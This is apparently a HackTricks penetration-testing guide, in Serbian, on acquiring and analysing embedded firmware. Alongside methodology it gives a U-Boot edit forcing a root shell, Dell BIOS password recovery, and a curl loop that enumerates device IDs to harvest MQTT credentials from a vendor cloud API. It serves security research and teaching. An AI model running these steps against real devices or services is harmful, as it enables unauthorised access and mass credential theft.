# Analiza firmvera

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Uvod**

### Povezani resursi

Za preuzimanje firmvera preko izloženih hardverskih interfejsa pogledajte [preuzimanje firmvera pomoću UART konzole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) i [preuzimanje SPI flash memorije](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Za ponovljivo UART snimanje tokom pokretanja, pre pristupa konzoli, pogledajte [SCPI-kontrolisano napajanje i preuzimanje podataka pomoću osciloskopa](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmver je ključni softver koji omogućava ispravan rad uređaja upravljajući komunikacijom između hardverskih komponenti i softvera s kojim korisnici rade. Čuva se u trajnoj memoriji, tako da uređaj može da pristupi važnim instrukcijama čim se uključi, što omogućava pokretanje operativnog sistema. Analiza i potencijalno menjanje firmvera ključni su koraci u otkrivanju bezbednosnih ranjivosti.<sup>[[2]](#references)[[3]](#references)</sup>

## **Prikupljanje informacija**

**Prikupljanje informacija** ključni je početni korak za razumevanje sastava uređaja i tehnologija koje koristi. Ovaj proces obuhvata prikupljanje podataka o:

- Arhitekturi CPU-a i operativnom sistemu koji koristi
- Specifičnostima bootloader-a
- Rasporedu hardvera i tehničkoj dokumentaciji
- Metrikama baze koda i lokacijama izvornog koda
- Spoljnim bibliotekama i tipovima licenci
- Istoriji ažuriranja i regulatornim sertifikatima
- Arhitektonskim dijagramima i dijagramima toka
- Bezbednosnim procenama i utvrđenim ranjivostima

U tu svrhu su alati za **open-source intelligence (OSINT)** neprocenjivi, kao i analiza dostupnih open-source softverskih komponenti putem ručnih i automatizovanih pregleda. Alati kao što su [Coverity Scan](https://scan.coverity.com) i [Semmle’s LGTM](https://lgtm.com/#explore) nude besplatnu statičku analizu koja može da se iskoristi za otkrivanje potencijalnih problema.

## **Preuzimanje firmvera**

Firmver se može pribaviti na više načina, od kojih svaki ima različit nivo složenosti:

- Direktno od izvora (razvojnih timova, proizvođača)
- Izgradnjom prema dostavljenim uputstvima
- Preuzimanjem sa zvaničnih sajtova za podršku
- Korišćenjem upita **Google dork** za pronalaženje hostovanih datoteka firmvera
- Direktnim pristupom **cloud skladištu**, pomoću alata kao što je [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Presretanjem **ažuriranja** pomoću man-in-the-middle tehnika
- **Izdvajanjem** iz uređaja preko veza kao što su **UART**, [**JTAG**](../hardware-hacking/jtag.md#halting-the-cpu-and-dumping-memoryflash) ili **PICit**
- **Prisluškivanjem** zahteva za ažuriranje u komunikaciji uređaja
- Pronalaženjem i korišćenjem **hardkodovanih krajnjih tačaka za ažuriranje**
- **Preuzimanjem** iz bootloader-a ili preko mreže
- **Uklanjanjem i očitavanjem** memorijskog čipa, kao krajnjom merom, pomoću odgovarajućih hardverskih alata

### Samo UART logovi: prisilno pokretanje root shell-a pomoću U-Boot okruženja u flash memoriji

Ako se UART RX ignoriše (dostupni su samo logovi), i dalje možete prisilno pokrenuti init shell tako što ćete **van mreže izmeniti U-Boot environment blob**:<sup>[[6]](#references)</sup>

1. Preuzmite SPI flash pomoću SOIC-8 klipse i programatora (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Pronađite U-Boot env particiju, izmenite `bootargs` tako da uključuje `init=/bin/sh` i **ponovo izračunajte U-Boot env CRC32** za blob.
3. Ponovo flešujte samo env particiju i restartujte uređaj; trebalo bi da se pojavi shell na UART-u.

Ovo je korisno na ugrađenim uređajima kod kojih je shell bootloader-a onemogućen, ali je env particija upisiva putem spoljnog pristupa flash memoriji.

### Otkrivanje zaštićenog koda pomoću Firewall zadatka za kopiranje

Neki MCU-ovi omogućavaju da nezaštićeni aplikativni kod pozove gateway za zaštićeni region umesto da direktno čita zaštićeni Flash. Nakon što obezbedite izvršavanje aplikativnog koda, pregledajte svaki gateway zadatak kao zaseban primitiv za prenos memorije. U slučaju uređaja Cypherock X1, STM32L4 Firewall call gate prihvatao je zadatak, spoljašnji pokazivač `data`, dužinu i zaštićenu adresu `address`. Zadatak za upis nije odbijao pokazivač izvornog podatka `data` koji je upućivao u Firewall Code. Pozivalac nije mogao direktno da čita taj kod, ali je sam gateway mogao da ga kopira u zaštićeno, neisparljivo skladište, čiji je sadržaj mogao da se očita pomoću dozvoljenog zadatka za čitanje.<sup>[[15]](#references)</sup>

Da biste ponovili ovu vrstu otkrivanja, pronađite upisivu stranicu zaštićenog skladišta sa odgovarajućim zadatkom za čitanje, postavite izvor upisa na uzastopne adrese zaštićenog koda i pročitajte kopirane bajtove. Pre ponovnog upisa proverite medijum za skladištenje: u ovom slučaju to je bio Flash, pa je stranicu trebalo obrisati pre ponovne upotrebe. Istraživači su koristili rutinu koja je brisala i vraćala važeći sadržaj Secure Data Storage-a, a zatim smeštali kod u preostali slobodan prostor umesto da prepišu podatke novčanika. Za ovo je potrebno izvršavanje koda na MCU-u i dostupan call gate; ovo nije direktno zaobilaženje zaštite čitanja sa neautentifikovanog hosta.<sup>[[15]](#references)</sup>

Oporavljeni kod može da otkrije [propuste u poverenju u ažuriranje firmvera i integritet pri pokretanju](firmware-integrity.md#fragmented-update-state-and-writable-integrity-metadata).<sup>[[15]](#references)</sup>

## Analiza firmvera

Sada kada **imate firmver**, potrebno je da izdvojite informacije o njemu kako biste znali kako da postupite. Za to možete da koristite različite alate:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ako pomoću tih alata ne pronađeš mnogo toga, proveri **entropiju** slike pomoću `binwalk -E <bin>`; ako je entropija niska, verovatno nije šifrovana. Ako je entropija visoka, verovatno je šifrovana (ili komprimovana na neki način).

Pored toga, pomoću ovih alata možeš da izdvojiš **datoteke ugrađene u firmver**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ili pomoću [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da pregledaš datoteku.

### Neobrađeni resursi za ekran u eksternom flešu

Eksterni SPI dump ne mora nužno da sadrži izvršni firmver MCU-a. Za Cortex-M metu, uporedi početak svakog potencijalnog regiona koda sa mapom memorije uređaja: uobičajena tabela vektora počinje verovatnom adresom steka u SRAM-u i adresom rukovaoca za reset u izvršnoj memoriji. To što na pomeraju nula nema tabele vektora samo po sebi ne dokazuje da ceo čip nema kod; pregledaj i druge pomeraje i način pokretanja. Ako `binwalk` ne pronađe kontejner, pregledaj neobrađene bajtove i poveži adrese čitanja fleša sa [dekodiranim SPI snimkom](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer) i radnjama kojima se učitavaju novi ekrani.<sup>[[14]](#references)</sup>

Za region sa resursima za ekran isprobaj moguće formate piksela i dimenzije, umesto da pretpostaviš da su u pitanju PNG/JPEG. U citiranom uređaju korišćeni su frejmovi formata **80×160 RGB565 little-endian**: sa dva bajta po pikselu, frejm ima **25.600 bajtova** (25 KiB), a ne 24 kilobita. Adresa očitana iz fleša otkrila je pomeraj resursa ekrana; istraživač je konvertovao pripremljenu sliku pomoću `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, zamenio resurs iste veličine u originalnom dumpu, upisao ga pomoću `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin` i potvrdio da se nova slika prikazuje na ekranu. Ovo pokazuje da su *eksterni resursi za ekran* upisivi, a ne da je interni firmver MCU-a izdvojen ili ponovo upisan. Sačuvaj originalni dump i proveri dimenzije, redosled bajtova, pomeraj i dužinu zamene pre svakog upisa.<sup>[[14]](#references)</sup>

### Diferencijalna analiza fleša i oporavljiva skladišta tajni XOR-ovanih vrednosti

Kada format skladištenja neke postavke firmvera nije dokumentovan, prvo napravi nekoliko podudarnih očitavanja fleša, promeni **tačno jednu** postavku, ponovo dumpuj ceo čip i uporedi pomeraje. Ponavljanje eksperimenta sa kontrolisanim vrednostima omogućava da razlikuješ postavku od brojača i metapodataka upisa; promene na novim pomerajima, umesto na istim mestima, ukazuju na skladište koje samo dodaje podatke ili je organizovano kao dnevnik. Sačuvaj obrisane/unakrsno označene unose jer njihovi bajtovi sadržaja mogu i dalje da se oporave.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nakon što pronađete region, izdvojite module firmvera pomoću alata kao što je `binwalk` i reverzno analizirajte writer/validator u Ghidra-i. Potvrdite granice polja, popunjavanje, indeksiranje ključa i derivaciju ključa u kodu, umesto da šemu zaključujete samo na osnovu obrazaca šifrovanog teksta.<sup>[[12]](#references)</sup>

#### Oporavak ključeva iz šifrovanog nultog popunjavanja

Kao što je opisano u [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), poznati otvoreni tekst otkriva bajtove keystream-a na istim pomerajima. Polje fiksne veličine posebno je izloženo kada se njegovo nulto popunjavanje proteže preko svih indeksa ključa koji se ponavlja: šifrovano popunjavanje direktno otkriva te bajtove ključa jer je `0x00 XOR key_byte = key_byte`. Ako su obuhvaćeni svi indeksi ključa, rekonstrušite ključ iz završnog dela šifrovanog teksta i dešifrujte popunjene bajtove.<sup>[[12]](#references)</sup>

Dell-ov ranjivi format DVAR BIOS lozinke konkretan je primer: bajt `0` polja od 32 bajta je u otvorenom tekstu, dok se bajtovi `1..31` obrađuju ključem koji se ponavlja na svakih 20 bajtova.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Za dužinu lozinke `L`, pozicije `L..31` bile su nule pre XOR operacije. Kada je `L <= 12`, te pozicije obuhvataju svaki indeks ključa, pa se ceo ključ i lozinka mogu oporaviti bez brute force-a:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Izvucite ključeve iz istorijskih zapisa

Nemojte analizirati svaki zapis zasebno. DVAR ključ se približno izvodi kao `modified_md5(device_seed || variable_GUID || password[0])`: device seed i GUID su fiksni, a jedini ulaz koji zavisi od lozinke jeste njen prvi bajt u čistom tekstu. To daje najviše 256 ključeva po uređaju, pa zapisi koji počinju istim bajtom dele ključ. Grupisanje aktivnih i obrisanih zapisa po tom bajtu omogućava da kratak istorijski zapis leak-uje ceo ključ kroz padding i dešifruje aktuelni, duži zapis čiji padding nije dovoljan. Zato rotacija lozinke može povećati izloženost kada se stari ciphertext označi kao obrisan, umesto da se izbriše.<sup>[[12]](#references)</sup>

Alat [`dellpwn`](https://github.com/R3n5k1/dellpwn) pronalazi DVAR, proverava kandidate za zapise, oporavlja lozinke i može da prikaže sirove sačuvane bajtove i bajtove ključa. Izgradite ga iz checkout-a i skenirajte proverenu flash sliku na sledeći način:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Za prilagođene parsere odbacujte lažno pozitivne rezultate proverom strukture zapisa, ograničenja za štampive znakove, dopune nulama, entropije ključa i doslednosti na mestu gde se ključ ponavlja. Ako ponovljeni dumpovi pokazuju retke promene bitova pri svakom upisu, navedite uočene maske i rangirajte moguće ispravke na osnovu ovih ograničenja, ali prijavite dvosmislene znakove umesto da heuristički rezultat predstavljate kao tačno izdvajanje.<sup>[[12]](#references)</sup>

Provere lozinki treba da čuvaju salted, iterirani jednosmerni hash umesto reverzibilnog šifrata, a skladišta sa logičkom strukturom treba bezbedno da uklanjaju zastareli tajni materijal.<sup>[[12]](#references)</sup>

### Dobavljanje fajl-sistema

Pomoću prethodno pomenutih alata, kao što je `binwalk -ev <bin>`, trebalo je da budete u mogućnosti da **izdvojite fajl-sistem**.\
Binwalk ga obično izdvaja u **fasciklu nazvanu po tipu fajl-sistema**, koji je najčešće jedan od sledećih: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ručno izdvajanje fajl-sistema

Ponekad binwalk **nema magic bajt fajl-sistema u svojim potpisima**. U tim slučajevima koristite binwalk da **pronađete pomeraj fajl-sistema i izdvojite komprimovani fajl-sistem** iz binarne datoteke, a zatim ga **ručno izdvojite** u skladu sa njegovim tipom, prateći korake u nastavku.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Pokrenite sledeću **dd komandu** za izdvajanje Squashfs fajl sistema.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativno, može se pokrenuti i sledeća komanda.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Za squashfs (korišćen u primeru iznad)

`$ unsquashfs dir.squashfs`

Datoteke će se zatim nalaziti u direktorijumu "`squashfs-root`".

- Datoteke CPIO arhive

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Za jffs2 fajl sisteme

`$ jefferson rootfsfile.jffs2`

- Za ubifs fajl sisteme sa NAND flash memorijom

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Rekonstrukcija podeljenih ugrađenih root fajl sistema

Ako sirovi eMMC/SSD dump sadrži ispravno zaglavlje fajl sistema, ali se njegovi pomeraji metapodataka protežu izvan nominalne particije, nemoj ga odmah proglasiti oštećenim. Ugrađeni boot kod može da sastavi stvarni root uređaj iz više fizičkih opsega pomoću Device Mapper-a, pa izdvajanje jedne GPT particije daje samo prvi segment.<sup>[[9]](#references)</sup>

#### Početna provera kompletne slike medija

Prvo proveri da li je pribavljanje podataka završeno, da li je veličina stabilna i da li neki proces još uvek upisuje u sliku. Ako ime datoteke sadrži početnu/završnu adresu, uporedi taj opseg sa stvarnim brojem bajtova. Oporavi GPT u režimu samo za čitanje i prikači samo potreban opseg; **nemoj** pokretati `vgchange -ay` nad nepouzdanim fizičkim volumenom na radnoj stanici, jer može doći do sukoba grupa volumena i nenamernih upisa.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Preferirajte privremenu VM kada originalna init logika ili LVM stek moraju da vide celu sliku. Istorijski zapisi pokretanja sa standardne boot particije posebno su korisni: bootloader je možda zabeležio pomeraje u vlasničkom kontejneru, dužine komponenti, izbor slota, pravila poravnanja i verifikaciju potpisa. Koristite te vrednosti da izdvojite ugrađene command line, kernel i initramfs, a zatim nezavisno proverite svaki izlaz pomoću `file`, bajtova potpisa i `binwalk`; čitanje do kraja kontejnera može slučajno da doda initrd, ACPI objekat ili potpis kernelu.<sup>[[9]](#references)</sup>

#### Otkrijte mapu blokova pri pokretanju

Izdvojite initramfs kernela i reverzno analizirajte njegov `/init` i sve biblioteke za skladištenje. U [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), pratite reference stringova za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` i putanje particija; zatim pratite kod koji bira aktivni A/B slot i pravi tabelu. Korisne početne tačke u radare2 su `r2 -A init`, `afl`, `pdf @ main` i `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Cilj linear mapira uzastopne opsege virtuelnog uređaja na opsege jednog ili više pozadinskih uređaja. Oporavljena tabela sa dva segmenta obično ima sledeći oblik (sve pozicije i dužine izražene su u sektorima od 512 bajtova):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Reprodukujte aritmetiku mašinskog koda tačno, uključujući širinu celih brojeva, pomeranja i konverzije jedinica. Na primer, sledeći izraz zaokružuje veličinu u bajtovima naniže na granicu od 4 KiB i tek zatim je pretvara u sektore od 512 bajtova; zamena izrazom `p4_bytes // 512` pomera izabrani završni deo za `p4_bytes % 4096` kada particija nije poravnata na granicu stranice.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruišite ravnu sliku za analizu kopiranjem opsega redosledom iz tabele, u ograničenim blokovima, umesto učitavanja kompletnog dump-a medija u memoriju. Time se izbegava i kreiranje mapper uređaja na hostu. Zadržite GPT izvedene pomake, obrnute brojeve sektora i rezultujuću dužinu izlaza kao zasebne provere.<sup>[[9]](#references)</sup>

#### Razlikujte oštećenje od konstantne greške u rekonstrukciji

Za SquashFS proverite magic vrednost `hsqs` i dekodirajte 64-bitno little-endian polje `bytes_used` na pomaku 40 u superbloku pre pokretanja `unsquashfs`. Ako ekstrakcija ne uspe u nekoliko nepovezanih struktura, pretražite širok opseg oko očekivanih pozicija i zahtevajte snažne strukturne kandidate: blok metapodataka koji može da se dekompresuje, nekoliko uzastopnih ispravnih unosa direktorijuma, uverljiva polja inode-a, root inode koji odgovara broju inode-ova ili ispravnu strukturu metapodataka integriteta. Jedno poklapanje magic vrednosti nije dovoljno.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Kada ista delta sa predznakom učini validnim nezavisne strukture — na primer, metapodatke direktorijuma i verity zapis — verovatni uzrok je sistematska greška u početku segmenta, a ne nedostajući bajtovi. Vratite se na obrnutu aritmetiku i potražite odbačene ostatke pri deljenju, predznak, prekoračenje ili zaokruživanje na sektor/stranicu pre nego što pokušate oporavak izgubljenih podataka ili izmenu metapodataka sistema datoteka.<sup>[[9]](#references)</sup>

Na kraju, držite granice zaštite odvojene: LUKS volumeni zapečaćeni TPM-om štite poverljivost podataka, dok potpisano dm-verity mapiranje štiti integritet korenskog sistema datoteka. Softverski TPM ne može da povrati ključ zapečaćen za originalni fizički TPM, a pokretanje izmenjenog SquashFS-a kroz init namenjen samo istraživanju koji izostavlja verity proveru ne falsifikuje njegov potpis niti zaobilazi dm-verity.<sup>[[9]](#references)</sup>

## Analiza firmvera

Kada se firmver pribavi, važno je analizirati ga kako bi se razumela njegova struktura i potencijalne ranjivosti. Ovaj proces podrazumeva korišćenje različitih alata za analizu i izdvajanje korisnih podataka iz slike firmvera.

### Alati za početnu analizu

Dat je skup komandi za početni pregled binarne datoteke (označene kao `<bin>`). Ove komande pomažu u prepoznavanju tipova datoteka, izdvajanju stringova, analizi binarnih podataka i razumevanju detalja o particijama i sistemu datoteka:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Da bi se procenio status šifrovanja image-a, proverava se **entropija** pomoću `binwalk -E <bin>`. Niska entropija ukazuje na odsustvo šifrovanja, dok visoka entropija ukazuje na moguće šifrovanje ili kompresiju.

Za izdvajanje **ugrađenih datoteka**, preporučuju se alati i resursi kao što su dokumentacija **file-data-carving-recovery-tools** i **binvis.io** za pregled datoteka.

### Izdvajanje fajl-sistema

Pomoću `binwalk -ev <bin>` obično se može izdvojiti fajl-sistem, često u direktorijum nazvan po tipu fajl-sistema (npr. squashfs, ubifs). Međutim, kada **binwalk** ne uspe da prepozna tip fajl-sistema zbog nedostajućih magic bytes, potrebno je ručno izdvajanje. To podrazumeva korišćenje `binwalk` za pronalaženje pomeraja fajl-sistema, a zatim komande `dd` za izdvajanje fajl-sistema:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Nakon toga se, u zavisnosti od tipa fajl sistema (npr. squashfs, cpio, jffs2, ubifs), koriste različite komande za ručno izdvajanje sadržaja.

### Analiza fajl sistema

Kada se fajl sistem izdvoji, počinje pretraga bezbednosnih propusta. Pažnja se posvećuje nebezbednim mrežnim daemonima, hardkodovanim akreditivima, API endpointima, funkcionalnostima servera za ažuriranje, nekompiliranom kodu, skriptama za pokretanje i kompajliranim binarnim datotekama koje se analiziraju van mreže.

**Ključne lokacije** i **stavke** koje treba pregledati obuhvataju:

- **etc/shadow** i **etc/passwd** za akreditive korisnika
- SSL sertifikate i ključeve u **etc/ssl**
- Konfiguracione i skriptne datoteke zbog mogućih ranjivosti
- Ugrađene binarne datoteke za dalju analizu
- Uobičajene web servere i binarne datoteke IoT uređaja

Nekoliko alata pomaže u otkrivanju osetljivih informacija i ranjivosti unutar fajl sistema:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) i [**Firmwalker**](https://github.com/craigz28/firmwalker) za pretragu osetljivih informacija
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) za sveobuhvatnu analizu firmvera
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) i [**EMBA**](https://github.com/e-m-b-a/emba) za statičku i dinamičku analizu

### Bezbednosne provere kompajliranih binarnih datoteka

I izvorni kod i kompajlirane binarne datoteke pronađene u fajl sistemu moraju se pažljivo proveriti na ranjivosti. Alati kao što su **checksec.sh** za Unix binarne datoteke i **PESecurity** za Windows binarne datoteke pomažu u prepoznavanju nezaštićenih binarnih datoteka koje bi mogle biti iskorišćene.

## Prikupljanje cloud konfiguracije i MQTT akreditiva pomoću tokena izvedenih iz URL-a

Mnogi IoT hubovi preuzimaju konfiguraciju za svaki uređaj sa cloud endpointa koji izgleda ovako:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Tokom analize firmvera možete otkriti da се `<token>` lokalno izvodi iz ID-a uređaja pomoću hardkodovane tajne, na primer:

- token = MD5( deviceId || STATIC_KEY ) i predstavljen je kao heksadecimalni zapis velikim slovima

Ovaj dizajn omogućava svakome ko sazna deviceId i STATIC_KEY da rekonstruiše URL i preuzme cloud konfiguraciju, koja često otkriva MQTT akreditive u čistom tekstu i prefikse tema.

Praktični postupak:

1) Izdvojite deviceId iz UART boot logova

- Povežite UART adapter od 3,3 V (TX/RX/GND) i snimite logove:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Potražite linije koje ispisuju obrazac URL-a konfiguracije u oblaku i adresu brokera, na primer:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Oporavite STATIC_KEY i algoritam tokena iz firmware-a

- Učitajte binarne datoteke u Ghidra/radare2 i potražite putanju konfiguracije ("/pf/") ili upotrebu MD5.
- Potvrdite algoritam (npr. MD5(deviceId||STATIC_KEY)).
- Izvedite token u Bash-u i pretvorite digest u velika slova:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Prikupite cloud konfiguraciju i MQTT pristupne podatke

- Sastavite URL i preuzmite JSON pomoću curl; raščlanite ga pomoću jq da biste izdvojili tajne:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Zloupotrebite MQTT u otvorenom tekstu i slabe ACL-ove za teme (ako postoje)

- Koristite pronađene akreditive da biste se pretplatili na teme za održavanje i potražili osetljive događaje:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Nabrojte predvidljive ID-jeve uređaja (u velikom obimu, uz odobrenje)

- Mnogi ekosistemi sadrže bajtove OUI-ja/proizvoda/tipa dobavljača, iza kojih sledi sekvencijalni sufiks.
- Možete programski prolaziti kroz moguće ID-jeve, izvoditi tokene i preuzimati konfiguracije:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Beleške
- Uvek pribavite izričito ovlašćenje pre pokušaja masovnog enumerisanja.
- Kad god je moguće, prednost dajte emulaciji ili statičkoj analizi radi pribavljanja tajni bez izmene ciljnog hardvera.


Proces emulacije firmware-a omogućava **dinamičku analizu** rada uređaja ili pojedinačnog programa. Ovaj pristup može naići na izazove zbog zavisnosti od hardvera ili arhitekture, ali prebacivanje root filesystem-a ili određenih binarnih datoteka na uređaj odgovarajuće arhitekture i endianness-a, kao što je Raspberry Pi, ili na unapred napravljenu virtuelnu mašinu, može olakšati dalje testiranje.

### Emulacija pojedinačnih binarnih datoteka

Pri analizi pojedinačnih programa ključno je utvrditi njihov endianness i CPU arhitekturu.

#### Primer sa MIPS arhitekturom

Za emulaciju binarne datoteke za MIPS arhitekturu može se koristiti komanda:

```bash
file ./squashfs-root/bin/busybox
```

A za instaliranje neophodnih alata za emulaciju:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Za MIPS (big-endian) koristi se `qemu-mips`, a za binarne datoteke little-endian izbor bi bio `qemu-mipsel`.

#### Emulacija ARM arhitekture

Za ARM binarne datoteke postupak je sličan, pri čemu se za emulaciju koristi emulator `qemu-arm`.

### Emulacija celog sistema

Alati kao što su [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) i drugi omogućavaju emulaciju celog firmvera, automatizujući postupak i pomažući u dinamičkoj analizi.

### Rekonstrukcija podeljenih i verifikovanih korenskih sistema datoteka za emulaciju

Ako je superblok SquashFS-a čitljiv, ali su pomeraji inode-a, direktorijuma ili tabele fragmenata nemogući, nemojte odmah menjati `unsquashfs`. Obrnutim inženjeringom analizirajte rani boot binarni fajl i ponovite graf blokovnih uređaja koji on kreira: ugrađeni sistemi mogu izložiti nominalnu root particiju, ali stvarni sistem datoteka kreirati pomoću `dm-linear` mapiranja koje dodaje sektore pozajmljene iz druge particije. Provere koje se oslanjaju samo na superblok mogu uspeti čak i kada su svi kasniji blokovi metapodataka pomereni.<sup>[[11]](#references)</sup>

Sačuvajte aritmetiku firmvera tačno onakvom kakva jeste. Posebno utvrdite da li su dužine izražene u bajtovima, sektorima od 512 bajtova ili stranicama od 4 KiB; ponovite pomeranja i skraćivanje istim redosledom kao u originalu; i uzmite u obzir završne oblasti koje zavise od banke u A/B rasporedima. Na primer, `(partition_bytes >> 12) << 3` prvo skraćuje vrednost na granicu od 4 KiB, a tek zatim izražava rezultat u sektorima od 512 bajtova; zamena sa `partition_bytes // 512` može pomeriti dodati opseg za nekoliko kilobajta i oštetiti sve naredne SquashFS tabele.<sup>[[11]](#references)</sup>

Korisni postupak validacije je:<sup>[[11]](#references)</sup>

1. Iz verifier/init binarnog fajla utvrdite izvorni uređaj, početni sektor i dužinu svakog `dm-linear` segmenta.
2. Konkatenirajte opsege ili ih mapirajte bez menjanja pravila poravnanja.
3. Ako ekstrakcija i dalje ne uspe, pretražite samo mali prozor oko predviđene granice i zahtevajte nekoliko uzastopnih važećih struktura metapodataka, umesto da prihvatite samo naizgled verovatan superblok.
4. Pokrenite neizmenjeni `unsquashfs` nad rekonstruisanom slikom; uspešno prolaženje kroz sve direktorijume i fragmente jači je dokaz od rezultata `unsquashfs -stat`.

#### Zamena dm-verity koju kontroliše analitičar

Kada analitičar kontroliše QEMU kernel, initramfs i virtuelne diskove, izmenjeni root može da se pokrene zamenom proizvođačevog verifikacionog PID 1 malim statički povezanim init-om. Ovo je **lab boot-chain substitution**, a ne zaobilaženje dm-verity, njegovog RSA potpisa, Secure Boot-a ili TPM-om zapečaćenog ključa.<sup>[[11]](#references)</sup>

